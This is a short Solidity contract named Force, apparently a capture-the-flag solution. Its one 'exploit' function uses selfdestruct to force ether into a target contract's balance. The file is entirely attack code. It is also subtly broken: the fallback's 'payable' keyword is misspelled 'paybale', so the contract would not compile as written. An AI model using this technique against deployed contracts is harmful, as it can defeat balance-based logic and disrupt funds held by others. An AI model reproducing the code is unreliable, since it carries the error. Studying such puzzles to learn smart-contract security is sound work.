pragma solidity ^0.4.20;
contract Force {
function() paybale{}

 function exploit(address _target) public {
    selfdestruct(_target);
 }
}